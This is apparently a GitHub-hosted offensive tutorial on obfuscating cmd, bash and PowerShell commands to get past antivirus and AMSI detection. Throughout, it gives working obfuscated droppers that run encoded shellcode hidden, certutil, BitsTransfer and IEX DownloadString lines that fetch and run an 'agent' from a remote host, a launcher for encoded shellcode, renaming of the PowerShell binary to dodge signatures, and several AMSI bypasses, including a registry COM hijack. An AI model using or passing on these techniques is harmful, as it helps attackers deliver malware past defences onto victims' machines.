![banner](http://i68.tinypic.com/2d1ux00.jpg)


                                                  - INTRO -

      I have found out that many A/V vendors and other detection frameworks and services were writing
      signatures for specific PowerShell attacks based solely on PowerShell execution arguments like:

      -exec bypass -win Hidden -noni -enc | -ep bypass -noni -w hidden -enc | .WebClient).DonwloadString

      That and the amazing work conducted by @danielbohannon in Invoke-Obfuscation, it took me to compile
      this article with a list of available obfuscation technics for cmd.exe (cmd-bat) bash (bash-sh) and
      powershell (psh-ps1), in one attempt to bypass AV's AMSI and DEP detection mechanisms and sandbox
      evasion technics. This article does not focus in shellcode obfuscation or crypting, but only in
      system call's that are (or migth) beeing detected by security suites like microsoft's AMSI ..

<br />

**Diagram of PowerShell execution arguments beeing flagged by AMSI security suites**<br />
![detection pic](http://i65.tinypic.com/2jz3as.jpg)<br />

**Example of one obfuscated powershell dropper** [ psh-dropper.ps1 ]<br />
![powershell obfuscation](http://i66.tinypic.com/t9bdaq.jpg)<br />

<br />

                                               - SPECIAL NOTE -

      remember that if we chose to use the 'batch' obfuscation technic, then it will only work in MS-DOS
      interpreter (cmd.exe or file.bat), If we use one 'batch' special character in powershell terminal
      console, then the powershell interpreter will not be able to escape the special character.

      Its also a good practice to test your obfuscation sourcecode in 'target' terminal console to check
      if the code its not broken with a missplaced special character or other diferent thing interfering
      with sourcecode normal execution, before sending your obfuscated code to target machine ..

      To conduct this kind of tests (In powershell) we need to allow the execution of powershell scripts.
                 1º - Start Windows PowerShell with the "Run as Administrator" option.
                 2º - Execute the follow in terminal: set-executionpolicy remotesigned
                 3º - To revert group policy to default: set-executionpolicy restricted


**Bad character sellection** [ batch escape character -used- in powershell interpreter ]
![bad character sellection](http://i64.tinypic.com/2u7c5kz.jpg)

**Good character sellection** [ powershell special character used in powershell interpreter ]
![powershell obfuscation](http://i64.tinypic.com/2u7c50n.jpg)

---

<br /><br /><br />

## Glosario (Index):
[0] <- Yes, just because in computing 0 its an importante number too :P<br />
[1] [Batch Obfuscation Technics (cmd-bat)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#batch-obfuscation-cmd-bat)<br />
[2] [Bash Obfuscation Technics (bash-sh)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bash-obfuscation-bash-sh)<br />
[3] [Powershell Obfuscation Technics (psh-ps1)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#powershell-obfuscation-psh-ps1)<br />
[4] [AMSI COM Bypass (hkcu hijacking)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#amsi-com-bypass-hkcu)<br />
[5] [Obfuscating msfvenom template (psh-cmd)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#obfuscating-the-metasploit-template-psh-cmd)<br />
[6] [Bypass Sanbox Execution (AVET)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bypass-the-scan-engine-daniel-sauder-avet)<br />
[7] [C to ANCII Obfuscated shellcode (c-ancii)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-to-ancii-obfuscation-c-ancii)<br />
[8] [FInal Notes - Remarks](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#final-notes---remarks)<br />
[9] [Special Thanks - Referencies](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#special-thanks)<br />

---

<br /><br /><br /><br /><br />

## Batch Obfuscation (cmd-bat)

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **batch special character: ^** <br />

- String obfuscated<br />

      cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode

![batch obfuscation](http://i68.tinypic.com/qx3xc6.jpg)

---

- String command to obfuscate<br />
`cmd.exe /c powershell.exe Get-WmiObject -Class win32_ComputerSystem`<br />
The above string can be obfuscated using the **batch special character: "** <br />

- String obfuscated<br />

      c"m"d.ex"e" /c pow"e"r"s"hell"."e"x"e G"e"t"-"Wmi"O"bje"c"t -Cl"a"ss win32_ComputerSystem

![batch obfuscation](http://i65.tinypic.com/2wbrzh0.jpg)
`HINT: In tests conducted i was not been able to use 2 letters inside double quotes (eg. c"md".exe)`

---

- Any formula under the **batch interpreter** can be started with the follow special characters: **@** or **=** or **,** or **;**

      =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      @cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      ,cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      ;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode


      cmd.exe /c @powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      cmd.exe /c =powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode


      [Using 3 diferent technics (=@|^|")]
      @c^m"d".ex^e /c ,p"o"wer^s^hell"."ex^e G"e"t"-"Wm^i"O"bje"c"t -Cl"a"s^s win32_ComputerSystem

![batch obfuscation](http://i66.tinypic.com/2ag6b6g.jpg)

---

- We can also **pipe** commands to avoid detection, adding rubish data into the beggining of the funtion

      echo "rubish data" | cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

![pipe commands](http://i66.tinypic.com/2lcbseo.jpg)

---

      Using a batch redirection caret (<nul) to add a extra layer of rubish data into our oneliner.
      HINT: the <nul caret will be replaced by a empty string at execution time, And If used the special
      character ^ at the end of the <nul caret them the token written next to it will also be replaced
      by a empty string, Example: cmd.exe /c start calc <nul ^DataToDelete

<br />


- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`

- String obfuscated (**<nul**) special character.<br />
`cmd.exe /c <nul powershell.exe <nul -nop -wind hidden -Exec Bypass -noni -enc $shellcode`

![batch obfuscation](http://i64.tinypic.com/2moo0om.jpg)

---

      Obfuscating windows batch files using undefined environmental variables.
      '''Inside .bat files''' undefined environmental variables are expanded into empty strings
      Since cmd.exe allows using variables inside commands, this can be used for obfuscation.

      Choose some set of environmental variables that you are certain are not defined
      on most of the machines Example: single or two letter variables like %A%, %0B%, %C% ..

<br />

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -Exec Bypass -noni -enc $shellcode`<br />

- String obfuscated (**undefined-vars.bat**)<br />

      @echo off
      %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
      exit

![batch obfuscation](http://i65.tinypic.com/16j287c.jpg)<br />
`HINT: Undefined variables technic are only accessible in bat scripting (it will not work in terminal)`

---

      We can also use batch local enviroment variables to scramble the syscall's
      Since cmd.exe allows using variables inside commands, this can be used for obfuscation.
      HINT: chose letters as: 'a e i o u' because they are the most commom ;)
      HINT: dont leave 'empty spaces' defining variables (set i#=t<empty-space>)

<br />

- String command to obfuscate<br />
`netstat -s | findstr Opens`<br />

- String obfuscated (**test.bat**)<br />

      @echo off
      set i#=t
      set pP0=p
      set db0=a
      set !h=n

      %!h%e%i#%st%db0%%i#% -"s" | fi%!h%ds%i#%r O%pP0%e%!h%s

![batch obfuscation](http://i64.tinypic.com/33lmik5.jpg)

---

      This next technic uses one batch local variable (%varObj%) as MasterKey that allow us to extract
      the strings inside the %varoBj% variable to build our command. [special thanks: @Wandoelmo Silva]

<br />

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />

- String obfuscated (**template.bat**)<br />

      @echo off
      SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
      %varObj:~2,1%%varObj:~11,1%%varObj:~3,1%.exe /c %varObj:~14,1%%varObj:~13,1%%varObj:~25,1%%varObj:~4,1%%varObj:~16,1%%varObj:~17,1%%varObj:~7,1%%varObj:~6,1%%varObj:~10,1%%varObj:~10,1%.exe -nop -%varObj:~25,1%%varObj:~8,1%%varObj:~3,1%%varObj:~3,1%%varObj:~4,1%%varObj:~12,1% -%varObj:~40,1%%varObj:~21,1%%varObj:~4,1%%varObj:~2,1% %varObj:~37,1%%varObj:~24,1%%varObj:~14,1%%varObj:~0,1%%varObj:~17,1%%varObj:~17,1% -noni -%varObj:~4,1%%varObj:~12,1%%varObj:~2,1% $shellcode
      exit

![batch obfuscation](http://i67.tinypic.com/2zdu9z7.jpg)

[!] [Description of %varObj% MasterKey (importante reading to understand the mechanism)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md)<br />

---

      [ certutil - Additional Methods for Remote Download ]
      Sometimes we need to use non-conventional methods to deliver our agent to target
      system and bypass detection, in this situation certutil can be an useful asset.

<br />

- String command to obfuscate<br />
`cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.71/agent.exe agent.exe && start agent.exe`<br />

- File **certutil-dropper.bat** to be executed in target system

      @echo off
      sEt !h=e
      sEt db=c
      sEt 0x=a
      echo [+] Please Wait, Installing software ..
      ;%db%M%A0%d"."eX%!h% /%db% @%db%e"r"Tu%A1%tIl.%!h%^xe "-"u^R%A0%l%db%Ac^h%!h% "-"sP%A0%l^i%A8%T -f ht%A0%tp://19%d0%2.1%A0%68.1.71/agent.exe agent.exe && start agent.exe
      exit

![batch obfuscation certutil.bat](http://i68.tinypic.com/jsfuq1.jpg)
`HINT: If you desire to send an .bat payload then delete 'start' from the sourcecode`<br />

---

      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
      the agent.bat dosen't contain any real malicious syscall's to be scan/flagged.

      HINT: Since windows dosen't have a base64 term interpreter built in installed,
      we have two choises to decode the base64 encoded syscall, or use the built in
      powershell (::FromBase64String) switch to decode our syscall or we chose to use
      certutil, but certuil onlly accepts strings taken from inside a text file, in
      that situation we instruct our script to writte the text files containing the
      obfuscated syscall's before further head using certutil to decode them.

      REMARK: If the local var can't be accessed from cmd, setX syscall=R2V0LURhdGUK

<br />

- String command to obfuscate<br />
`Get-Date`

- using base64 to decode the encoded syscall

      1º - encode the command you want to obfuscate (linux-terminal)
      echo "Get-Date" | base64

      2º - copy the encoded string to paste it on your script
      R2V0LURhdGUK

      3º - Insert the follow lines into your batch script

        @echo off
        set syscall=R2V0LURhdGUK :: <-- WARNING: Dont leave any 'empty spaces' in variable creation
        powershell.exe $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:syscall)); powershell.exe $decoded ::<-- execute/decode the base64 syscall at runtime

![batch obfuscation](http://i66.tinypic.com/qzfbex.jpg)

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

## Bash Obfuscation (bash-sh)

- String command to obfuscate<br />
`whoami`<br />
The above string can be obfuscated using **bash special characters: '** or **\\** or **$@**<br />

- String obfuscated<br />

      w'h'o'am'i <-- This technic requires to 'open' and 'close' the single quotes

      w"h"oa"m"i <-- This technic requires to 'open' and 'close' the double quotes

      w\h\o\am\i

      w$@h$@o$@am$@i

      w$@h\o$@a"m"'i' <-- Using the 4 previous methods together 

![3 special characters](http://i68.tinypic.com/2yphdvs.png)

---

- We can also **pipe** commands to avoid detection with **|** or **;** or **&&**

      echo "Rubish data" | w$@h$@o\am$@i

      echo $@I A\M; who\am$@i

      echo $@I A\M; wh$@oam$@i && echo o\ff$@cou$@rs\e .\.

![pipe bash obfuscation](http://i64.tinypic.com/2eg8io9.png)

---

      Using rev <<< to reverse the order of the characters in a string.
      Using this technic allow us to writte the syscall's backwards and
      decode/revert them at run-time execution (auto-exec: |$0 = /bin/bash).

<br />

- String command to obfuscate<br />
`lsblk -m`<br />

- String obfuscated <br />
`rev <<< 'm- klbsl' |$0`

![bash rev obfuscation](http://i68.tinypic.com/23vj9yw.png)

- String command to obfuscate<br />
`whoami`<br />

- String obfuscated <br />
`rev <<< i$@ma\o$@hw |$0`

![bash rev obfuscation](http://i64.tinypic.com/2u9sj91.png)
`HINT: Single quotes are not allowed in Combining rev <<< and the batch \ escape character`

---

      This next technic uses one bash local variable ($M) as MasterKey that allow us to extract
      strings inside the $M variable to build our command and sends it to a file named meme.
      [special thanks to: @Muhammad Samaak]

<br />

- String command to obfuscate<br />
`route`<br />

- String obfuscated (**oneliner**)<br />

      M="ureto" && echo ${M:1:1}${M:4:1}${M:0:1}${M:3:1}${M:2:1} > meme; ul meme;
      [ print parsed data on screen (route syscall pulled from inside $M variable) ]

![bash obfuscation](http://i64.tinypic.com/wbfl9w.jpg)

      M="ureto" && echo ${M:1:1}${M:4:1}${M:0:1}${M:3:1}${M:2:1} |$0
      [ parsing data inside $M variable to extract and 'execute' the string: route ]

![bash obfuscation](http://i64.tinypic.com/5k1qb7.jpg)
`HINT: The var ${M:0:1} extracts the letter U from inside the $M local var to build: route`

---

      This next technic uses $s bash local variable to extract the letters from the variable $skid then
      uses a loop funtion (for i in) to take the arrays and convert them into a string, them the pipe | tr -d
      command will delete the empty lines from the string and passes the output (pipe) to 'do echo ${skid[$i]}'
      funtion that prints the results (full string) on screen, the 'done' funtion will close the 'for i in' loop.
      [special thanks to: @Muhammad Samaak]

<br />

- String command to obfuscate<br />
`whoami`<br />

- String obfuscated (**oneliner**)<br />

      skid=(i h w o a m r w X);s=(2 1 3 4 5 0);for i in ${s[@]};do echo ${skid[$i]} | tr -d '\n';done
      [ parsing data inside $skid and $s variables to extract the string: whoami ]

![bash obfuscation](http://i67.tinypic.com/2e0lgqr.png)

      skid=(i h w o a m r w X);s=(2 1 3 4 5 0);for i in ${s[@]};do echo ${skid[$i]} | tr -d '\n';done |$0
      [ parsing data inside $skid and $s variables to 'extract' and 'execute' the string: whoami ]

![bash obfuscation](http://i68.tinypic.com/e6t0tw.png)

`HINT: The number 0 inside variable $s conrresponds to the letter possition in var $skid (i)`

---

      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
      the agent.sh dosen't contain any real malicious syscall's to be scan/flagged. 

<br />

- String command to obfuscate<br />
`route -n`

- Using base64 to decode the encoded syscall (test.sh)

      1º - encode the command you want to obfuscate (linux-terminal)
      echo "route -n" | base64

      2º - copy the encoded string to paste it on your script
      cm91dGUgLW4K

      3º - Insert the follow lines into your bash script

        #!/bin/sh
        string=`echo "cm91dGUgLW4K" | base64 -d`
        $string   #<-- execute/decode the base64 syscall at runtime

![bash obfuscation](http://i63.tinypic.com/4kwker.jpg)

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

## Powershell Obfuscation (psh-ps1)

- String command to obfuscate<br />
`powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **powershell special character: `**<br />

- String obfuscated<br />

      po`wer`shel`l.ex`e -n`op -w`in`d h`idd`en -E`xe`c B`yp`ass -n`on`i -en`c $shellcode

![powershell obfuscation](http://i63.tinypic.com/2nvt7wz.jpg)

---

- Using one **batch** local variable inside the **powershell interpreter**

      cmd.exe /c "set var=Get-Date&& cmd.exe /c echo %var%^" | powershell.exe

      [ "powershell" can be also set and called as variable in cmd.exe ]
      cmd.exe /c "set p1=power&& set p2=shell&& cmd /c echo Write-Host SUCCESS ^| %p1%%p2%.exe"

![powershell obfuscation](http://i65.tinypic.com/2liea90.jpg)

- More Obfuscated using powershell **`** and batch **^** special characters

      c`md`.e`xe /c "s^Et va^r=Get-Date&& c^md^.e^xe /c e^ch^o %var%^" | power`shell.`ex`e

![powershell obfuscation](http://i67.tinypic.com/3509rw5.jpg)

---

      We can obfuscate the syscall's by simple split them into local variables and concaternate
      them using 'tick' + 'splatting' obfuscation methods inside variable declarations.

<br />

- String command to obfuscate<br />
`powershell.exe Get-WmiObject -Class Win32_ComputerSystem`<br />
The above string can be obfuscated using **powershell special characters:** **`** and **+** and **$var** and **'**<br />

- String obfuscated<br />

      $get = "G`et-Wm`iObj`ect"                     #<-- caret ` inside double quotes
      $sys = 'Wi'+'n32_C'+'ompu'+'terS'+'ystem'     #<-- caret + inside single quotes
      p`ow`ers`hell.e`xe $get -Class $sys           #<-- de-obfuscate syscall's at run-time

![powershell obfuscation](http://i63.tinypic.com/71pe0h.jpg)

---
      Powershell also allow us to access windows environment variables using the $env: switch
      Using $env:LOCALAPPDATA (windows environment variable) and -Join '' to pull out the 0º ,23º, 21º,7º and 7º
      chars from $env:LOCALAPPDATA and then the -Join '' operator will take the array and convert it to a string.

<br />

- String command to obfuscate<br />
`powershell.exe Get-WmiObject -Class Win32_ComputerSystem`

- String obfuscated<br />

      $call = $env:LOCALAPPDATA[0,23,21,7,7]-Join ''
      powershell.exe Get-WmiObject -$call Win32_ComputerSystem

![powershell obfuscation](http://i66.tinypic.com/334kh9w.jpg)

---

      [ .Split powershell method ]
      Build a variable named $encoded with the 'SPLIT' syscall inside, and use $encoded.Split("~~") -Join ''
      to 'de-split' the syscall into a new local variable named $decoded, to be called at run-time.

<br />

- String command to obfuscate<br />
`Get-WmiObject -Class Win32_ComputerSystem`

- String obfuscated<br />

      $encoded = "Get-W~~miO~~bject -C~~la~~ss Wi~~n32_Co~~mput~~erSystem"
      $decoded = $encoded.Split("~~") -Join ''
      poweshell.exe $decoded 

![powershell obfuscation](http://i66.tinypic.com/2v2k2lt.jpg)

---

      [ -Replace powershell method ]
      Build a variable named $encoded with the 'SPLIT' syscall inside, and use $encoded.Replace("~~","")
      to 'de-split' the syscall into a new local variable named $decoded, to be called at run-time.

<br />

- String command to obfuscate<br />
`(New-Object Net.WebClient).DownloadString('http://192.168.1.71/Hello.ps1')`

- String obfuscated<br />

      $encoded= "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/Hello.ps1')"
      $decoded = $encoded.Replace("~~","")
      IEX $decoded

      [ OR -Replace which is case-sensitive replace ]
      $decoded = $encoded-Replace "~~","")
      IEX $decoded


![powershell obfuscation](http://i63.tinypic.com/10wi1b8.jpg)

---

      [ ScriptBlock -Replace method ]
      Build a variable named $ScriptBlock with the 'SPLIT' syscall inside, and use .Replace("+","")
      to 'de-split' the syscall into a new local variable named $syscall, to be called at run-time.

<br />

- String command to obfuscate<br />
`Win32_OperatingSystem`

- String obfuscated<br />

      $ScriptBlock = "Wi'+'n?32_O'+'p%era'+'ti%n%gS'+'y?st%em"
      $syscall = $ScriptBlock.Replace("?","").Replace("'","").Replace("+","").Replace("%","")
      Get-CimInstance $syscall | Select-Object CSName, OSArchitecture, Caption, SystemDirectory | FL *

![powershell obfuscation](http://i64.tinypic.com/2la6dmu.jpg)

---

      [ RTLO ] Powershell cames with one buitin feature (::Reverse) that allow us to change the
      text alignment from left to rigth side (arabe alignment). That built in feature allow us
      to use it as obfuscation technic (writing syscall's backwards) and 'revert' them at run-time.

<br />

- String command to obfuscate<br />
`powershell.exe Get-Date`

- String obfuscated<br />

      [ Using ::Reverse method ]
      $reverseCmd = "etaD.teG exe.llehsrewop"
      $reverseCmdCharArray = $reverseCmd.ToCharArray();[Array]::Reverse($reverseCmdCharArray);
      ($ReverseCmdCharArray-Join '') | IEX

      [ Using Regex method ]
      $reverseCmd = "etaD.teG exe.llehsrewop"
      IEX (-Join[RegEx]::Matches($reverseCmd,'.','RightToLeft')) | IEX


![powershell obfuscation](http://i67.tinypic.com/2labt3d.jpg)

---

      [ -f reorder parameter ]
      Using -f (reorder) switch to re-order the strings in there correct order, the switch
      -f accepts strings separated by a comma, and the caret {} contains the string position
      after the -f switch.. HINT: we are going to replace another syscall by one splatting
      local variable to be called at execution time also (3 obfuscation technics used).

<br />

- String command to obfuscate<br />
`Get-Service` And `TeamViewer`

- String obfuscated<br />
`("{0}{2}{1}{3}" -f'vice','Ser','G','et-')` And `$first='Te'+'amV'+'iewer'`

![powershell obfuscation](http://i66.tinypic.com/21eublh.jpg)

      Stacking 're-order' commands together with the ; operator. Remmenber that we can also
     store the re-order method inside an local variable to be called at run-time.
      Example: $syscall = ("{3}{0}{2}{4}" -f'voke','es','-Expr','In','sion')

- String command to obfuscate<br />
`Invoke-Expression (New-Object)`

- String obfuscated<br />
`$a=("{3}{0}{2}{1}{4}" -f'voke','es','-Expr','In','sion') ; $r=("{0}{2}{1}" -f'(New','ject)','-Ob')`

![powershell obfuscation](http://i67.tinypic.com/1znx11e.jpg)
`HINT: we can also scramble the location of the vars ($a | $r) inside the sourcecode (order)`<br />
`to obfuscate it further, and then call them in the correct order executing the powershell command.`

---

      Another way to use 'splatting + reorder' technic to remote download/execute agent

- String command to obfuscate<br />
`IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.71/Hello.ps1")`

- String obfuscated<br />

      I`E`X ('({0}w-Object {0}t.WebClient).{1}String("{2}19`2.16`8.1`.71/He`ll`o.ps`1")' -f'Ne','Download','http://')

![powershell obfuscation](http://i65.tinypic.com/2h55mb4.jpg)

---

      [ Additional Methods for exec base64 shellcode ]
      Since the powershell -enc method started to be used to execute base64 shellcode strings that it became
      very targeted by security suites to flag alerts, In order to circumvent -enc parameter we decided to
      use powershell commands and leverage set-variables with .value.toString() in order to piece together
      our -enc command into the command line. This allows us to specify -enc without ever calling -enc which
      would be hit by detection rules. [ ReL1k ]


<br />

- File **Unicorn.ps1** (base64 shellcode execution)

      $syscall=("{1}{0}" -f'N','-Wi'); $flag=("{1}{0}{2}" -f'Id','h','DEn'); $cert=("{1}{0}" -f'p','-E'); $pem=("{1}{2}{0}" -f'SS','by','pA'); powershell -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "n"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell $syscall $flag $cert $pem (get-variable P).value.toString() ENCODED-BASE64-SHELLCODE"

![powershell obfuscation](http://i66.tinypic.com/kdabsh.png)

      HINT: I have re-written REL1K's template to accept -WiN hIdDEn -Ep bYpASS (reorder obfuscation)
      and change the powershell 'EncodingCommand' from -ec to -en (less used flag by pentesters).

---

      [ BitsTransfer - Additional Methods for Remote Download ]
      Another way to download/execute remotelly our agent without using the powershell switch
      (Net.WebClient).DownloadFile method. This method also allow us to chose the download
      location of the agent in target system and start the agent (exe).

      HINT: powershell gives us access to windows environment variables using the $env: switch

<br />

- File **test.ps1** (trigger download/execution)

      Import-Module BitsTransfer
      Start-BitsTransfer -Source "http://192.168.1.71/agent.exe" -Destination "$env:tmp\\agent.exe"
      Invoke-Item "$env:tmp\\agent.exe" #<-- trigger agent execution

![powershell obfuscation test.ps1](http://i66.tinypic.com/23u8ua8.jpg)

- Execution of **agent.exe** in target system (auto-exec)

![powershell obfuscation msfconsole](http://i63.tinypic.com/2lo6a9e.jpg)

---

      [ Invoke-WebRequest - Additional Methods for Remote Download ]
      This method 'Invoke-WebRequest' working together with 'OutFile' and 'File'  powershell parameters
      allow us to remote download (full path can be inputed into sourcecode string) and execute our script.

      HINT: If you wish to download/execute an binary.exe, then replace the -File by Invoke-Item parameter
      HINT: To upload to another location use $env: powershell var (eg. -OutFile "$env:tmp\\Invoke-Hello.ps1")
      HINT: In this example was not used the -win hidden switch that allow us to hidde the powershell windows
      HINT: Delete -PassThru from the sourcecode to NOT display the download traffic in target terminal, that
      parameter was left behind for article readers to see the download connection taking place ..


<br />

- File **Invoke-WebRequest.ps1** (trigger download/execution)

      Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "hello.ps1" -PassThru; Start-Sleep 1; powershell.exe -File hello.ps1

![powershell Additional Methods for Remote Download](http://i63.tinypic.com/2mpx7wl.jpg)

---

      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
      the agent.ps1 dosen't contain any real malicious syscall's to be scan/flagged. 

<br />

- String command to obfuscate<br />
`Date`

- using powershell to decode base64 syscall


      1º - encode the command you want to obfuscate (linux-terminal)
      echo "Date" | base64

      2º - copy the encoded string to paste it on your script
      RGF0ZQo=

      3º - Insert the follow lines into your powershell script

        $Certificate="RGF0ZQo="
        $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Certificate))
        powershell.exe Get-$decoded   #<-- execute/decode the base64 syscall at runtime

![powershell obfuscation](http://i64.tinypic.com/2cyfeck.jpg)

Here we can view the all process of encoding/decoding in powershell console
![powershell obfuscation](http://i65.tinypic.com/6xqett.jpg)

---

- More obscure obfuscated/bypass technics<br />

      If the proccess name is 'powershell' and the command line arguments match some specific
      patterns, AMSI/AV's will flag that input as malicious. there are 3 main ways to bypass it:

<br />

     1º - Obfuscate the name of the powershell binary in target system before execute any
          powershell commands. This can be achieved by making a copy of powershell.exe and
          rename it to Firefox.exe using an agent.bat before further ahead call the obfuscated
          powershell binary (Firefox.exe) to execute our powershell command line arguments.

      Copy-Item "$env:windir\System32\Windowspowershell\v1.0\powershell.exe" -Destination "$env:tmp\Firefox.exe"
      cd $env:tmp; .\Firefox.exe -noP -wIn hIdDEn -enc ..SNIPET..

![powershell rename](http://i63.tinypic.com/k0rhnt.jpg)

<br />

     2º - Unlink the command-line arguments from the code they deliver, one example of that its
          the ability of powershell to consume commands from the standart input stream ( pipe | )
          When viewed in the event log, the arguments to powershell.exe are no longer visible.

      cmd.exe /c "echo Get-ExecutionPolicy -List" | powershell.exe
      cmd.exe /c "set var=Get-ExecutionPolicy -List&& cmd.exe /c echo %var%^" | powershell.exe

![powershell rename](http://i67.tinypic.com/in8keu.jpg)

<br />

      3º - obfuscating powershell statements (IEX | Invoke-Expression | etc)
           obfuscating this kind of 'calls' are not has easy like most powershell variables
           declarations are, If we try to set any variable pointing to one powershell statement
           then the interpreter will fail to descompress the variable into an command. The next
           two screenshots shows how it fails if we try to use the conventional way, and how to
           bypass it using the Invoke-Command statement that has the ability to transform inputs
           into 'strings' that can deal with that limitation, allowing us to call the statement
           IEX previous stored inside a local powershell variable .. 
           
      [The conventional way]
      $obf="iex"
      $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
      powershell $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
      Invoke-Command $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')

![var declaration fail](http://i66.tinypic.com/6jn238.jpg)

      [Using Invoke-Command statement wrapped in double quotes]
      powershell -C "$obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')"

![var declaration success](http://i65.tinypic.com/2hx85g3.jpg)

---

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
[3] [All Hail to ''@danielbohannon'' for its extraordinary work (obfuscation) under powershell](https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf)<br />

---

<br /><br /><br /><br />

## AMSI COM Bypass (HKCU)

      Microsoft’s Antimalware Scan Interface (AMSI) was introduced in Windows 10 as a standard interface
      that provides the ability for AV engines to apply signatures to buffers both in memory and on disk.

![enigma0x3 - AMSI Bypass](http://i66.tinypic.com/mrstv9.png)
`HINT: Invoke-Expression powershell command flagging AMSI detection`<br />

<br />

- **AMSI** .COM Object DLL hijacking [ enigma0x3 ]

      [ AMSI COM Bypass ] Since the COM server is resolved via the HKCU hive first, a normal user can hijack
      the InProcServer32 key and register a non-existent DLL (or a malicious one if you like code execution).
      In order to do this, there are two registry entries that need to be made:

<br />

      Windows Registry Editor Version 5.00
      [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}]
      [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32]
      @="C:\\IDontExist.dll"

<br />

      When AMSI attempts to starts its COM component, it will query its registered CLSID and return a
      non-existent COM server. This causes a load failure and prevents any scanning methods from being
      accessed, ultimately rendering AMSI useless. Now, when we try to run our “malicious” AMSI test sample,
      you will notice that it is allowed to execute because AMSI is unable to access any of the scanning
      methods via its COM interface:

![enigma0x3 - AMSI Bypass](http://i67.tinypic.com/2vv6x41.png)

- **Being mean** .. [ one agent.bat with AMSI bypass abilities ;) ]<br />

![enigma0x3 - AMSI Bypass](http://i65.tinypic.com/2rpv0hv.png)

---

<br /> 

- **AMSI** bypass using nul bits

      Bypass AMSI mechanism using nul bits before the actual funtion occurs.
      For file contents, insert "#<NULL>" at the beginning of the file, and any places
      where additional scans with AMSI occur. For command line contents, wrap them into
      Invoke-Expression and prepend 'if(0){{{0}}}' -f $(0 -as [char]) +'

<br />

- For **command line** contents<br />

       powershell IEX ('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Ne'+'t.WebC'+'lient').DownloadString('ht'+'tp:/'+'/'+'19'+'2.168.1.7'+'1/Invoke-Hello.ps1')

- OR (using [#NULL] before the monitorized syscall)

      powershell Write-Host "#<NULL>"; I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.168.1.71/hello.ps1")' -f'Ne','Download','http://','lie')

![enigma0x3 - AMSI Bypass](http://i63.tinypic.com/14ec6f5.jpg)


- For file contents<br />

![enigma0x3 - AMSI Bypass](http://i64.tinypic.com/15d8gsy.png)

---

- Bypass or Avoid AMSI by **version Downgrade** <br />

      Force it to use PowerShell v2: PowerShell v2 doesn't support AMSI at the time of writing.
      If .Net 3.0 is available on a target Windows 10 machine (which is not default) PowerShell
      v2 can be started  with the -Version option.

<br />

